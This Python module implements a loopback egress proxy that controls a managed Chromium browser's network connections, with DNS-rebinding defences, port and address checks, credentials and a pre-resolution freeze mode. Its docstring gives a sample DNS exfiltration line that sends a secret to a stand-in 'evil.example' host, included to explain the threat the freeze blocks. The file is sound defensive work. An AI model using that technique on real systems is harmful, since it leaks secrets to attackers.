"""The connection-time egress boundary for managed Chromium traffic.

Every TCP connection Lumi's browser makes is opened by this process, not by
Chromium and not by Playwright's driver. Chromium is launched with
`--proxy-server` pointing at a loopback listener this module owns, and with
`--proxy-bypass-list=<-loopback>` so that loopback -- which Chromium bypasses
proxies for *by default* -- has no private door either. Requests arrive here in
one of two shapes, both proven against the supported Chromium and Playwright in
`tests/test_egress_broker_browser.py`:

* `CONNECT host:port` -- what Chromium sends for `https:`, and what Playwright's
  Node driver sends for **everything** it fetches from a route handler,
  including plaintext `http:` test origins.
* `GET http://host/path` (absolute form) -- what Chromium sends for plaintext
  `http:` it fetches itself.

What the broker adds over the Milestone 7a/7b network guard is one property the
guard could never have:

    resolve  ->  check every address  ->  dial one of *those* addresses

The guard checks a destination and then asks somebody else to connect to it, so
a hostile resolver can answer once for the check and again for the connection
(DNS rebinding). Here there is a single resolution, and the socket is opened to
a literal address taken from it. There is no second lookup to poison.

Deliberately **not** here:

* **No TLS interception.** A permitted `CONNECT` is answered with `200` and then
  spliced byte for byte. SNI, certificate validation, hostname verification,
  HSTS and certificate transparency stay Chromium's, unchanged and unweakened.
  No certificate authority is generated, installed or trusted, and a certificate
  error stays an error.
* **No scope decision.** *Which* public hosts a task may read is the runtime's
  and the guard's question; a CONNECT tunnel does not even carry the path. The
  broker answers the narrower one: may a socket be opened to this address at
  all. Shape, method, resource type, redirects and content type remain the
  guard's, which is why both layers stay.
* **No general proxy.** It binds loopback on an ephemeral port, every request
  including `CONNECT` must carry a per-launch `Proxy-Authorization` credential,
  and it dies with the process that started it. Another program on the machine
  that finds the port gets `407`.

`BrokerMode.FROZEN` is the primitive Milestone 8b's network freeze will be built
on, and it is why the broker had to exist before that milestone rather than
alongside it: a route handler that aborts requests cannot stop a DNS lookup, and
a DNS lookup is a working exfiltration channel (`fetch('https://' + secret +
'.evil.example/')` tells the attacker the secret whether or not the connection
succeeds). While frozen, the broker refuses **before** calling the resolver.
"""

import asyncio
import base64
import hmac
import ipaddress
import logging
import re
import secrets
import uuid
from collections import Counter
from collections.abc import Awaitable, Callable
from dataclasses import dataclass, field
from enum import Enum
from urllib.parse import urlsplit

from app.domain.public_url import (
    PublicUrlPolicy,
    Resolver,
    UrlPolicyError,
    address_is_public,
    resolve_public_addresses,
    system_resolver,
)

logger = logging.getLogger("lumi.browser.egress_broker")

#: The only port a public destination may be reached on. Plaintext HTTP to the
#: public internet is refused by URL shape anyway; this additionally removes the
#: `CONNECT internal-host:22` class of request outright.
PUBLIC_PORT = 443
MAX_HEAD_BYTES = 16_384
HEAD_TIMEOUT_SECONDS = 15.0
CONNECT_TIMEOUT_SECONDS = 10.0
RELAY_CHUNK = 65_536
CREDENTIAL_BYTES = 32
#: How many recent dial addresses the counters keep. Diagnostics, not a ledger.
MAX_REMEMBERED_DIALS = 256

_HOP_BY_HOP = frozenset({b"proxy-authorization", b"proxy-connection", b"keep-alive", b"te"})
#: The one shape a brokered configured origin may take: a local fixture site.
_LOOPBACK_ORIGIN = re.compile(r"^http://127\.0\.0\.1:[0-9]{1,5}$")
#: Everything a DNS name may contain. Labels themselves are checked by the
#: policy; this only guarantees the authority is a name and not a smuggled URL.
_HOST_NAME = re.compile(r"^[a-z0-9.-]{1,253}$")


class BrokerMode(Enum):
    """Whether the broker may open connections at all."""

    OPEN = "open"
    #: Refuse everything, before resolving anything. See the module docstring.
    FROZEN = "frozen"


@dataclass(frozen=True, slots=True)
class BrokerCredential:
    """The `Proxy-Authorization` a launch mints for itself. Never logged."""

    username: str
    password: str

    @classmethod
    def mint(cls) -> "BrokerCredential":
        return cls(username="lumi", password=secrets.token_urlsafe(CREDENTIAL_BYTES))

    @property
    def header_value(self) -> str:
        raw = f"{self.username}:{self.password}".encode()
        return "Basic " + base64.b64encode(raw).decode("ascii")


@dataclass(slots=True)
class BrokerCounters:
    """Bounded, closed diagnostics. Codes and counts, never URLs or headers."""

    allowed: Counter[str] = field(default_factory=Counter)
    refused: Counter[str] = field(default_factory=Counter)
    #: Upstream name lookups this broker performed. The freeze acceptance test
    #: asserts this does not move.
    resolutions: int = 0
    unauthenticated: int = 0
    #: The most recent addresses the broker actually opened a socket to, oldest
    #: first, bounded so a long-lived worker cannot grow this without limit.
    dialled: list[str] = field(default_factory=list)
    #: How many dials there have been in total, including forgotten ones.
    dial_count: int = 0

    def record_dial(self, address: str) -> None:
        self.dial_count += 1
        self.dialled.append(address)
        if len(self.dialled) > MAX_REMEMBERED_DIALS:
            del self.dialled[: len(self.dialled) - MAX_REMEMBERED_DIALS]

    def snapshot(self) -> dict[str, object]:
        return {
            "allowed": dict(self.allowed),
            "refused": dict(self.refused),
            "resolutions": self.resolutions,
            "unauthenticated": self.unauthenticated,
            "dial_count": self.dial_count,
            "dialled": list(self.dialled),
        }


@dataclass(frozen=True, slots=True)
class Destination:
    """A destination that passed policy, and the addresses it may be dialled at."""

    host: str
    port: int
    addresses: tuple[str, ...]
    #: True for an exactly-configured plaintext origin (a local fixture site).
    configured_origin: bool

    @property
    def address_class(self) -> str:
        return "configured_origin" if self.configured_origin else "public"


class BrokerRefusal(Exception):
    """A destination the broker will not dial. `code` is stable and safe to log."""

    def __init__(self, code: str) -> None:
        super().__init__(f"The connection was refused ({code}).")
        self.code = code


Connector = Callable[[str, int], Awaitable[tuple[asyncio.StreamReader, asyncio.StreamWriter]]]


async def _dial(address: str, port: int) -> tuple[asyncio.StreamReader, asyncio.StreamWriter]:
    """Open a socket to a literal address. Never a name: names are resolved above."""
    return await asyncio.open_connection(host=address, port=port)


class EgressBroker:
    """A loopback CONNECT/HTTP proxy that resolves, checks, and pins the dial.

    One broker per browser launch. Its generation identity, its credential and
    its port are minted together and die together, so a credential from a worker
    that has been replaced cannot be presented to its successor.
    """

    def __init__(
        self,
        policy: PublicUrlPolicy,
        *,
        configured_origins: frozenset[str] = frozenset(),
        resolver: Resolver = system_resolver,
        connector: Connector = _dial,
        mode: BrokerMode = BrokerMode.OPEN,
        resolve_timeout_seconds: float = 5.0,
        connect_timeout_seconds: float = CONNECT_TIMEOUT_SECONDS,
    ) -> None:
        self.generation = uuid.uuid4()
        self.credential = BrokerCredential.mint()
        self.counters = BrokerCounters()
        self.mode = mode
        self._policy = policy
        self._origins = {origin.rstrip("/").lower() for origin in configured_origins}
        for origin in self._origins:
            if _LOOPBACK_ORIGIN.fullmatch(origin) is None:
                # A configured origin is a *local fixture*, and nothing else is
                # allowed to skip resolution and pinning. A public destination
                # configured here would be dialled by name, which is exactly the
                # unpinned connection this module exists to remove.
                raise ValueError("a brokered configured origin must be http://127.0.0.1:<port>")
        self._origin_authorities = {
            urlsplit(origin).netloc.lower() for origin in self._origins if urlsplit(origin).netloc
        }
        self._resolver = resolver
        self._connector = connector
        self._resolve_timeout = resolve_timeout_seconds
        self._connect_timeout = connect_timeout_seconds
        self._expected_authorization = self.credential.header_value
        self._server: asyncio.base_events.Server | None = None
        self._port: int | None = None
        self._connections: set[asyncio.Task[None]] = set()

    # ---- lifecycle -----------------------------------------------------------

    async def start(self) -> None:
        """Bind loopback on an ephemeral port. Readiness is this returning."""
        if self._server is not None:  # pragma: no cover - callers start once.
            return
        server = await asyncio.start_server(self._serve, host="127.0.0.1", port=0)
        self._server = server
        self._port = int(server.sockets[0].getsockname()[1])
        logger.info(
            "egress broker started",
            extra={"broker_generation": str(self.generation), "mode": self.mode.value},
        )

    @property
    def port(self) -> int:
        if self._port is None:
            raise RuntimeError("the egress broker has not been started")
        return self._port

    @property
    def server_url(self) -> str:
        return f"http://127.0.0.1:{self.port}"

    @property
    def active_connections(self) -> int:
        """Connections this broker currently holds open, being parsed or relayed.
        Milestone 8b's freeze entry will require this to be zero before it can
        claim nothing was in flight."""
        return len(self._connections)

    def proxy_settings(self) -> dict[str, str]:
        """Playwright's `proxy=` argument for the managed browser.

        `bypass` carries Chromium's `<-loopback>` token, which means the exact
        opposite of what the option name suggests: *do not* bypass the proxy for
        loopback. Passing it explicitly rather than relying on Playwright's own
        default makes the emitted `--proxy-bypass-list` deterministic and
        independent of `PLAYWRIGHT_DISABLE_FORCED_CHROMIUM_PROXIED_LOOPBACK`.
        """
        return {
            "server": self.server_url,
            "username": self.credential.username,
            "password": self.credential.password,
            "bypass": "<-loopback>",
        }

    def freeze(self) -> int:
        """Refuse every new connection, before any name is resolved.

        Returns how many connections were already being relayed, which is the
        number a caller must have driven to zero before it may claim that
        nothing left the machine. Milestone 8b, not this slice, is what consumes
        that number; the primitive exists here because a freeze that happens
        after a DNS lookup is not a freeze.
        """
        self.mode = BrokerMode.FROZEN
        logger.info("egress broker frozen", extra={"broker_generation": str(self.generation)})
        return self.active_connections

    def thaw(self) -> None:
        self.mode = BrokerMode.OPEN

    async def aclose(self) -> None:
        """Stop listening and drop every relay. Browser traffic fails after this."""
        server, self._server = self._server, None
        if server is not None:
            server.close()
            try:
                await server.wait_closed()
            except Exception:  # pragma: no cover - platform teardown noise.
                pass
        for task in list(self._connections):
            task.cancel()
        self._connections.clear()
        self._port = None

    # ---- destination policy ---------------------------------------------------

    def _configured_origin(self, host: str, port: int) -> bool:
        return f"{host.lower()}:{port}" in self._origin_authorities

    async def _decide(self, host: str, port: int) -> Destination:
        """Resolve and check, or refuse. The only place a destination is approved."""
        if self.mode is BrokerMode.FROZEN:
            # Before the resolver, deliberately: a name lookup is itself a
            # message to whoever runs the resolver.
            raise BrokerRefusal("frozen")
        if not host or len(host) > 253:
            raise BrokerRefusal("invalid_host")
        if self._configured_origin(host, port):
            return Destination(
                host=host, port=port, addresses=(host,), configured_origin=True
            )
        if port != PUBLIC_PORT:
            raise BrokerRefusal("port_not_allowed")
        try:
            ipaddress.ip_address(host)
        except ValueError:
            pass
        else:
            # An address literal has no name to resolve and no certificate to
            # bind to. Only an exactly-configured origin may be one, and that
            # was checked above.
            raise BrokerRefusal("ip_literal")
        if _HOST_NAME.fullmatch(host) is None:
            # The authority is checked as a *string* before it is spliced into a
            # URL, so `evil.example/path` cannot be parsed as the host
            # `evil.example` and quietly lose the rest.
            raise BrokerRefusal("invalid_host")
        try:
            checked = self._policy.check(f"https://{host}/")
        except UrlPolicyError as error:
            raise BrokerRefusal(error.code) from None
        self.counters.resolutions += 1
        try:
            addresses = await resolve_public_addresses(
                checked.host, self._resolver, self._resolve_timeout
            )
        except UrlPolicyError as error:
            raise BrokerRefusal(error.code) from None
        return Destination(
            host=checked.host,
            port=port,
            addresses=tuple(addresses),
            configured_origin=False,
        )

    async def _connect(
        self, destination: Destination
    ) -> tuple[asyncio.StreamReader, asyncio.StreamWriter]:
        """Dial one of the checked addresses, and nothing else."""
        last: Exception | None = None
        for address in destination.addresses:
            if not destination.configured_origin and not address_is_public(address):
                # Unreachable while `resolve_public_addresses` is the only
                # source of these, and asserted here because the day it is not,
                # this is the line that must fail.
                raise BrokerRefusal("non_public_address")
            try:
                self.counters.record_dial(address)
                return await asyncio.wait_for(
                    self._connector(address, destination.port), timeout=self._connect_timeout
                )
            except (OSError, TimeoutError, asyncio.TimeoutError) as error:
                last = error
        raise BrokerRefusal("upstream_unreachable") from last

    # ---- the listener ---------------------------------------------------------

    async def _serve(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter) -> None:
        task = asyncio.current_task()
        if task is not None:
            self._connections.add(task)
        try:
            await self._handle(reader, writer)
        except asyncio.CancelledError:
            raise
        except Exception:  # pragma: no cover - a broker must never take the worker down.
            logger.warning(
                "egress broker connection failed",
                extra={"broker_generation": str(self.generation)},
            )
        finally:
            if task is not None:
                self._connections.discard(task)
            _close(writer)

    async def _handle(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter) -> None:
        try:
            head = await asyncio.wait_for(_read_head(reader), timeout=HEAD_TIMEOUT_SECONDS)
        except (TimeoutError, asyncio.TimeoutError):
            return
        if head is None:
            return
        request_line, header_lines, body = head
        try:
            method, target, _ = request_line.decode("latin-1").split(" ", 2)
        except ValueError:
            await _respond(writer, 400, "bad_request")
            return
        method = method.upper()
        headers = _headers(header_lines)

        if not self._authorized(headers.get(b"proxy-authorization")):
            self.counters.unauthenticated += 1
            await _respond(writer, 407, "proxy_authentication_required")
            return

        if method == "CONNECT":
            await self._tunnel(reader, writer, target)
            return
        await self._forward(reader, writer, method, target, header_lines, body)

    def _authorized(self, presented: bytes | None) -> bool:
        if presented is None:
            return False
        return hmac.compare_digest(
            presented.decode("latin-1", "replace").strip(), self._expected_authorization
        )

    def _refuse(self, code: str, transport: str) -> None:
        self.counters.refused[code] += 1
        logger.info(
            "egress broker refused a connection",
            extra={
                "broker_generation": str(self.generation),
                "refusal": code,
                "transport": transport,
            },
        )

    def _allow(self, destination: Destination, transport: str) -> None:
        self.counters.allowed[transport] += 1
        logger.debug(
            "egress broker opened a connection",
            extra={
                "broker_generation": str(self.generation),
                "transport": transport,
                "address_class": destination.address_class,
            },
        )

    async def _tunnel(
        self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter, target: str
    ) -> None:
        host, port = _split_authority(target)
        if port is None:
            self._refuse("invalid_host", "connect")
            await _respond(writer, 400, "bad_request")
            return
        try:
            destination = await self._decide(host, port)
            upstream_reader, upstream_writer = await self._connect(destination)
        except BrokerRefusal as refusal:
            self._refuse(refusal.code, "connect")
            await _respond(writer, 403, refusal.code)
            return
        self._allow(destination, "connect")
        writer.write(b"HTTP/1.1 200 Connection Established\r\n\r\n")
        await writer.drain()
        # From here the broker is a pipe. It does not read, rewrite, terminate
        # or inspect the TLS inside it, and it holds no certificate that would
        # let it.
        await _splice(reader, writer, upstream_reader, upstream_writer)

    async def _forward(
        self,
        reader: asyncio.StreamReader,
        writer: asyncio.StreamWriter,
        method: str,
        target: str,
        header_lines: list[bytes],
        body: bytes,
    ) -> None:
        parts = urlsplit(target)
        if parts.scheme.lower() != "http" or not parts.netloc:
            # Origin-form or an unknown scheme: not a proxy request at all.
            self._refuse("not_a_proxy_request", "http")
            await _respond(writer, 400, "bad_request")
            return
        host = parts.hostname or ""
        port = parts.port or 80
        origin = f"http://{parts.netloc.lower()}"
        if origin not in self._origins:
            # Plaintext HTTP is reachable only for an exactly-configured origin
            # (a local fixture). Public plaintext is refused by URL shape and
            # refused again here.
            self._refuse("plaintext_not_allowed", "http")
            await _respond(writer, 403, "plaintext_not_allowed")
            return
        try:
            destination = await self._decide(host, port)
            upstream_reader, upstream_writer = await self._connect(destination)
        except BrokerRefusal as refusal:
            self._refuse(refusal.code, "http")
            await _respond(writer, 403, refusal.code)
            return
        self._allow(destination, "http")
        path = parts.path or "/"
        if parts.query:
            path = f"{path}?{parts.query}"
        rewritten = [f"{method} {path} HTTP/1.1".encode("latin-1")]
        rewritten.extend(
            line
            for line in header_lines
            if line.split(b":", 1)[0].strip().lower() not in _HOP_BY_HOP
            and line.split(b":", 1)[0].strip().lower() != b"connection"
        )
        # One request per proxy connection: the client is told not to reuse it,
        # so a second request cannot ride a tunnel opened for another host.
        rewritten.append(b"Connection: close")
        upstream_writer.write(b"\r\n".join(rewritten) + b"\r\n\r\n" + body)
        await upstream_writer.drain()
        await _splice(reader, writer, upstream_reader, upstream_writer)


# ---- wire helpers -------------------------------------------------------------


async def _read_head(
    reader: asyncio.StreamReader,
) -> tuple[bytes, list[bytes], bytes] | None:
    data = b""
    while b"\r\n\r\n" not in data:
        chunk = await reader.read(4_096)
        if not chunk:
            return None
        data += chunk
        if len(data) > MAX_HEAD_BYTES:
            return None
    head, _, body = data.partition(b"\r\n\r\n")
    lines = head.split(b"\r\n")
    return lines[0], [line for line in lines[1:] if line], body


def _headers(lines: list[bytes]) -> dict[bytes, bytes]:
    headers: dict[bytes, bytes] = {}
    for line in lines:
        name, separator, value = line.partition(b":")
        if separator:
            headers[name.strip().lower()] = value.strip()
    return headers


def _split_authority(target: str) -> tuple[str, int | None]:
    """`host:port`, `[v6]:port`. A missing or invalid port is not guessed."""
    if target.startswith("["):
        host, separator, port = target.partition("]")
        host = host[1:]
        port = port.lstrip(":") if separator else ""
    else:
        host, _, port = target.rpartition(":")
    if not host or not port.isdigit():
        return target, None
    number = int(port)
    if not 1 <= number <= 65_535:
        return host, None
    return host.lower(), number


async def _respond(writer: asyncio.StreamWriter, status: int, code: str) -> None:
    reason = {400: "Bad Request", 403: "Forbidden", 407: "Proxy Authentication Required"}.get(
        status, "Error"
    )
    lines = [f"HTTP/1.1 {status} {reason}"]
    if status == 407:
        lines.append('Proxy-Authenticate: Basic realm="lumi"')
    # The refusal code is stable, safe to show and carries no destination.
    lines.extend([f"X-Lumi-Refusal: {code}", "Content-Length: 0", "Connection: close", "", ""])
    try:
        writer.write("\r\n".join(lines).encode("ascii"))
        await writer.drain()
    except (OSError, ConnectionError):  # pragma: no cover - the client went away.
        pass


def _close(writer: asyncio.StreamWriter) -> None:
    try:
        if not writer.is_closing():
            writer.close()
    except (OSError, ConnectionError):  # pragma: no cover
        pass


async def _pump(source: asyncio.StreamReader, sink: asyncio.StreamWriter) -> None:
    try:
        while True:
            chunk = await source.read(RELAY_CHUNK)
            if not chunk:
                break
            sink.write(chunk)
            await sink.drain()
    except (OSError, ConnectionError, asyncio.IncompleteReadError):
        pass
    finally:
        _close(sink)


async def _splice(
    client_reader: asyncio.StreamReader,
    client_writer: asyncio.StreamWriter,
    upstream_reader: asyncio.StreamReader,
    upstream_writer: asyncio.StreamWriter,
) -> None:
    try:
        await asyncio.gather(
            _pump(client_reader, upstream_writer),
            _pump(upstream_reader, client_writer),
        )
    finally:
        _close(upstream_writer)
        _close(client_writer)


#: Extra Chromium switches the managed browser is launched with.
#:
#: * `--disable-quic`: QUIC is UDP, and an HTTP proxy cannot carry it. Chromium
#:   will not use QUIC for an origin reached through a proxy, but "will not" from
#:   documentation is not the same as "cannot", and the flag costs nothing.
#: * `--disable-background-networking`: Chromium's own update, variations and
#:   domain-reliability traffic has no business being brokered, would be refused
#:   anyway, and would otherwise show up in the refusal counters as noise.
MANAGED_CHROMIUM_ARGS: tuple[str, ...] = (
    "--disable-quic",
    "--disable-background-networking",
)


#: Which Chromium distribution Playwright launches. `"chromium"` means **full
#: Chromium** -- `chrome.exe` -- in both headed and headless mode, using
#: Chromium's own new headless implementation rather than the separate
#: `chrome-headless-shell` binary Playwright otherwise prefers for
#: `headless=True`.
#:
#: Milestone 8a needs this, and it is a packaging fact as much as a launch
#: option. Manual sign-in (S2) needs a visible window, which the headless shell
#: cannot provide, so `scripts/build-agent-runtime.mjs` bundles full Chromium
#: and **not** the shell (`playwright install --no-shell chromium`). Without the
#: channel, `launch(headless=True)` looks for
#: `chromium_headless_shell-<revision>` and fails outright in a packaged build.
#:
#: Setting it here rather than at each call site means development and the
#: packaged build launch the *same binary*, so "it worked on my machine" cannot
#: mean "my machine had the other browser in its cache".
MANAGED_CHROMIUM_CHANNEL = "chromium"


def managed_launch_options(broker: EgressBroker, *, headless: bool) -> dict[str, object]:
    """Exactly how the managed browser is launched. Asserted by a test.

    Every field here is load-bearing. `proxy.server` makes the broker the route;
    `proxy.bypass` carries `<-loopback>`, without which Chromium reaches
    `http://127.0.0.1:...` directly and the broker is decorative; the credential
    stops any other local process using the listener as an open proxy; and
    `channel` pins which Chromium binary is launched, in both modes.
    """
    return {
        "channel": MANAGED_CHROMIUM_CHANNEL,
        "headless": headless,
        "proxy": broker.proxy_settings(),
        "args": list(MANAGED_CHROMIUM_ARGS),
    }


__all__ = [
    "MANAGED_CHROMIUM_ARGS",
    "MANAGED_CHROMIUM_CHANNEL",
    "PUBLIC_PORT",
    "BrokerCounters",
    "BrokerCredential",
    "BrokerMode",
    "BrokerRefusal",
    "Connector",
    "Destination",
    "EgressBroker",
    "managed_launch_options",
]
